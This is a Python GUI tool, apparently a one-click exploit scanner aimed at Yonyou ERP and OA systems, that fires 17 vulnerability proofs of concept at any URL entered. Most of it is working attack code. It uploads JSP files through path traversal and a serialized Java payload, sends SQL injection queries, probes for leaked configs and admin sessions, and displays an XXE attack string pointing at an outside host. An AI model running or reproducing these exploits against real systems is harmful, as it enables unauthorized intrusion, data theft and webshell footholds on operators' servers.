import PySimpleGUI as sg
import requests
layout=[
            [sg.Text("用友系列一把梭--POC (点击确认后等待即可) ")],
            [sg.Text("仅限用友系列系统，其它系统会误报")],
            [sg.Text("如果漏洞存在则会弹窗提示该漏洞名称，请耐心等待！")],
            [sg.Text("URL：  "),sg.InputText("http://127.0.0.1:8080")],  
            [sg.Button("确认")]
                  ]

#poc###########################################################################################################
#prop.xml(数据库配置)
def poc_prop(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
    }
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/ierp/bin/prop.xml",headers=headers,verify=False,timeout=3)
        req_text = req.text
        if (req_text.find("dataSource")!=-1):
            sg.Popup("存在 /ierp/bin/prop.xml文件泄露 ！！！")
    except:
        pass
    print("/ierp/bin/prop.xml文件泄露检测完成-------验证方式： /ierp/bin/prop.xml")

################################################################################################################
#用友 ERP-NC NCFindWeb 目录遍历漏洞
def poc_filename(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
    }
    
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/NCFindWeb?service=IPreAlertConfigService&filename=/",headers=headers,verify=False,timeout=3)
        req_text = req.text
        if (req_text.find(".jsp")!=-1):
            sg.Popup("存在 /NCFindWeb?service=IPreAlertConfigService&filename=/ 任意文件读取 ！！！")
    except:
        pass
    print("用友 ERP-NC NCFindWeb 目录遍历漏洞检测完成-------验证方式： /NCFindWeb?service=IPreAlertConfigService&filename=/")

################################################################################################################
#用友 NC bsh.servlet.BshServlet 远程命令执行漏洞
def poc_BeanShell(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
    }
    
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/servlet/~ic/bsh.servlet.BshServlet",headers=headers,verify=False,timeout=3)
        req_text = req.text
        if (req_text.find("BeanShell")!=-1):
            sg.Popup("存在 servlet/~ic/bsh.servlet.BshServlet命令执行 ！！！")
    except:
        pass
    print("用友 NC bsh.servlet.BshServlet 远程命令执行漏洞检测完成-------验证方式： /servlet/~ic/bsh.servlet.BshServlet")

################################################################################################################
#用友 NCCloud FS文件管理SQL注入
def poc_sql(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
    }
   
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/fs/",headers=headers,verify=False,timeout=3)
        req_text=req.text
        if (req_text.find("yonyou")!=-1):
            sg.Popup("存在 sql注入，访问目录/fs/ 截取登录数据包放入sqlmap ！！！")
    except:
        pass
    print("NCCloud FS文件管理SQL注入检测完成-------验证方式： 访问/fs/截取登录数据包放入sqlmap")

################################################################################################################
#用友-GRP-U8存在文件上传漏洞
def poc_UploadFileData(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
        'Accept-Encoding': 'gzip'
    }
    files = {
        'myFile': ('test.jpg', '<%out.print("test");%>', 'multipart/form-data')
    }

    
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        requests.post(url+"/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=evil.jsp&filename=1.jpg",headers=headers,files=files,verify=False,timeout=3)
        req=requests.get(url+"/R9iPortal/evil.jsp",headers=headers,verify=False,timeout=3)
        req_text = req.text
        if (req_text.find("test") != -1):
            sg.Popup("用友-GRP-U8存在文件上传漏洞，路径在 /R9iPortal/evil.jsp ！！！")
    except:
        pass
    print("用友-GRP-U8存在文件上传漏洞检测完成-------验证方式： /R9iPortal/evil.jsp ")

################################################################################################################
#用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞
def poc_manager(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
    }
 
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/system/mediafile/templateOfTaohong_manager.jsp?path=/",headers=headers,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("存在 /system/mediafile/templateOfTaohong_manager.jsp?path=/ 任意文件读取 ！！！")

    except:
        pass
    print("用友 FE协作办公平台目录遍历漏洞检测完成-------验证方式： /system/mediafile/templateOfTaohong_manager.jsp?path=/")

################################################################################################################
#用友U8-OA系统getSessionList.jsp文件cmd参数泄漏敏感信息
def poc_mgetSessionList(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
    }
 
    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll",headers=headers,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("存在 getSessionList.jsp 敏感信息泄漏 ！！！")

    except:
        pass
    print("getSessionList.jsp 敏感信息泄漏检测完成-------验证方式： /yyoa/ext/https/getSessionList.jsp?cmd=getAll")

################################################################################################################
#用友GRP-U8 Proxy SQL注入
def poc_proxy(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding":"gzip,deflate",
        "DNT":"1",
        "Connection":"close",
        "Upgrade-Insecure-Requests":"1",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data='''cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'''

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.post(url+"/Proxy",headers=headers,data=data,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("存在 GRP-U8 Proxy SQL注入 ！！！")

    except:
        pass
    print("GRP-U8 Proxy SQL注入检测完成")

################################################################################################################
#用友NC6.5 accept.jsp任意文件上传
def poc_accept(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
        'Accept-Encoding': 'gzip'
    }
    files={
        'file': ('images.jpg', '<% out.println("bea86d66a5278f9e6fa1112d2e2fcebf"); %>', 'image/jpeg'),
        'fname':(None,'/webapps/nc_web/iio.jsp','image/jpeg')
    }

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        requests.post(url+"/aim/equipmap/accept.jsp",headers=headers,files=files,verify=False,timeout=3)
        req=requests.get(url+"/iio.jsp",headers=headers,verify=False,timeout=3)
        if(req.status_code==200):
            sg.Popup("存在 用友NC6.5 accept.jsp任意文件上传，已经上传 /iio.jsp文件 ！！！")

    except:
        pass
    print("用友NC6.5 accept.jsp任意文件上传检测完成-------验证方式： /iio.jsp ")

################################################################################################################
#用友NC6.5反序列化文件上传漏洞
def poc_FileReceiveServlet(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36",
        "Accept-Encoding": "gzip,deflate",
        "Accept": "*/*",
        "Connection":"close",
        "Content-Type":"multipart/form-data;",
        "Referer":"https://google.com"
    }
    data="\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        requests.post(url+"/servlet/FileReceiveServlet",headers=headers,data=data,verify=False,timeout=3)
        req=requests.get(url+"/t00ls.jsp",headers=headers,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("存在 用友NC6.5反序列化文件上传漏洞，已上传 /t00ls.jsp文件 ！！！")
    except:
        pass
    print("用友NC6.5反序列化文件上传漏洞检测完成-------验证方式： /t00ls.jsp")

################################################################################################################
#用友 U8 OA test.jsp文件存在 SQL注入漏洞
def poc_test(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
    }

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))",headers=headers,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("用友U8 OA test.jsp文件存在 SQL注入漏洞 ！！！")
    except:
        pass
    print("用友 U8 OA test.jsp文件存在 SQL注入漏洞检测完成")

################################################################################################################
#用友时空 KSOA ImageUpload任意文件上传漏洞
def poc_KSOAUpload(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
    }
    data ='''123456'''

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        requests.post(url+"/servlet/com.sksoft.bill.ImageUpload?filename=test.txt&filepath=/",data=data,headers=headers,verify=False,timeout=3)
        req=requests.get(url+"/pictures/test.txt",headers=headers,verify=False,timeout=3)
        req_text=req.text
        if (req_text.find("123456") != -1):
            sg.Popup("用友时空 KSOA ImageUpload存在任意文件上传漏洞，访问/pictures/test.txt文件 ！！！")
    except:
        pass
    print("用友时空 KSOA ImageUpload存在任意文件上传漏洞检测完成-------验证方式： /pictures/test.txt")

################################################################################################################
# 用友NC系统uapws wsdl XXE 漏洞
def poc_wsdl(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
    }

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/uapws/service/nc.uap.oba.update.IUpdateService?wsdl",headers=headers,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("攻击方式：/uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://1.1.1.1/evil.xml 存在用友NC系统uapws wsdl XXE 漏洞！！！")
    except:
        pass
    print("用友NC系统uapws wsdl XXE 漏洞检测完成")

################################################################################################################
# 用友致远A6协同系统setextno.jsp SQL注入
def poc_setextno(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
    }

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23",headers=headers,verify=False,timeout=3)
        if (req.status_code==200):
            sg.Popup("存在 用友致远A6协同系统setextno.jsp SQL注入漏洞 ！！！")
    except:
        pass
    print("用友致远A6协同系统setextno.jsp SQL注入漏洞检测完成")

################################################################################################################
# 用友致远A6严重敏感信息泄露
def poc_createMysql(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
    }

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.get(url+"/yyoa/ext/createMysql.jsp",headers=headers,verify=False,timeout=3)
        req1=requests.get(url+"/yyoa/createMysql.jsp",headers=headers,verify=False,timeout=3)
        if (req.status_code==200 | req1.status_code==200):
            sg.Popup("存在 用友致远A6严重敏感信息泄露漏洞 ！！！")
    except:
        pass
    print("用友致远A6严重敏感信息泄露漏洞检测完成-------验证方式： /yyoa/ext/createMysql.jsp 或 /yyoa/createMysql.jsp")

################################################################################################################
# 用友致远OA协同办公系统管理员cookie泄露导致任意文件上传
def poc_thirdpartyController(url):
    headers = {
        "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"

    }
    data='''method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1'''

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        req=requests.post(url+"/seeyon/thirdpartyController.do",headers=headers,data=data,verify=False,timeout=3)
        req_text = req.text
        if (req_text.find("sessionid") != -1):
            sg.Popup("存在 用友致远OA协同办公系统管理员cookie泄露导致任意文件上传，访问 /seeyon/thirdpartyController.do 查看session ！！！")
    except:
        pass
    print("用友致远OA协同办公系统管理员cookie泄露导致任意文件上传漏洞检测完成")

################################################################################################################
# 用友GRP-U8 U8AppProxy任意文件上传漏洞
def poc_U8AppProxy(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close",
        "Cookie": "JSESSIONID=635F2271089E7A7E66F3F84824553DEE",
        "Upgrade-Insecure-Requests": "1",
        "If-Modified-Since": "Mon, 01 Feb 2016 08:01:00 GMT",
        'If-None-Match': 'W/"5732-1454313660000"',
        "Accept-Encoding": "gzip"
    }
    files = {
        'file': ('1.jsp', '<% out.println("yongyouu8");%>', 'image/jpeg'),
    }

    requests.packages.urllib3.disable_warnings()
    try:
        url=url[0]
        requests.post(url+"/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test",headers=headers,files=files,verify=False,timeout=3)
        req = requests.get(url+"/yongyouU8_test.jsp", headers=headers, verify=False, timeout=3)
        req_text = req.text
        if (req_text.find("yongyouu8") != -1):
            sg.Popup("存在 用友GRP-U8 U8AppProxy任意文件上传漏洞，访问/yongyouU8_test.jsp ！！！")
    except:
        pass
    print("用友GRP-U8 U8AppProxy任意文件上传漏洞检测完成-------验证方式： /yongyouU8_test.jsp")
################################################################################################################

window=sg.Window('用友系列一把梭--POC(仅对用友系列)',layout) 
if __name__ == '__main__':
    while True:
        event,values=window.read() 
        print(event,values)
        if event==None: 
            break
        poc_prop(values)  # prop.xml(数据库配置)
        poc_filename(values)  # 用友 ERP-NC NCFindWeb 目录遍历漏洞
        poc_BeanShell(values)  # 用友 NC bsh.servlet.BshServlet 远程命令执行漏洞
        poc_sql(values)  # 用友 NCCloud FS文件管理SQL注入
        poc_UploadFileData(values)  # 用友-GRP-U8存在文件上传漏洞
        poc_manager(values)  # 用友FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞
        poc_mgetSessionList(values)  # 用友U8-OA系统getSessionList.jsp文件cmd参数泄漏敏感信息
        poc_proxy(values)  # 用友GRP-U8 Proxy SQL注入
        poc_accept(values) #用友NC6.5 accept.jsp任意文件上传
        poc_FileReceiveServlet(values) #用友NC6.5反序列化文件上传漏洞
        poc_test(values)#用友 U8 OA test.jsp文件存在 SQL注入漏洞
        poc_KSOAUpload(values)#用友时空 KSOA 任意文件上传漏洞
        poc_wsdl(values)#用友NC系统uapws wsdl XXE 漏洞
        poc_setextno(values)#用友致远A6协同系统setextno.jsp SQL注入
        poc_createMysql(values)#用友致远A6严重敏感信息泄露漏洞
        poc_thirdpartyController(values)#用友致远OA协同办公系统管理员cookie泄露导致任意文件上传
        poc_U8AppProxy(values)#用友GRP-U8 U8AppProxy任意文件上传漏洞
        sg.Popup("检测完成------------")
